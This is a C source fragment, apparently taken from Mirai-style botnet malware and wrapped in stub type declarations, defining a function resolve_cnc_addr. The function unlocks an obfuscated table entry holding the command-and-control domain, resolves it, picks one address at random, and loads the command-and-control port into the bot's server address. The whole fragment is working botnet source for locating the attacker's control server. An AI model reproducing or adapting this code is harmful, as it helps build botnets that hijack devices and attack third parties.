
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct resolv_entries {size_t addrs_len; int * addrs; } ;
typedef int port_t ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; } ;


 int TABLE_CNC_DOMAIN ;
 int TABLE_CNC_PORT ;
 int printf (char*) ;
 size_t rand_next () ;
 int resolv_entries_free (struct resolv_entries*) ;
 struct resolv_entries* resolv_lookup (scalar_t__) ;
 TYPE_2__ srv_addr ;
 int table_lock_val (int ) ;
 scalar_t__ table_retrieve_val (int ,int *) ;
 int table_unlock_val (int ) ;

__attribute__((used)) static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, ((void*)0)));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == ((void*)0))
    {



        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, ((void*)0)));
    table_lock_val(TABLE_CNC_PORT);




}
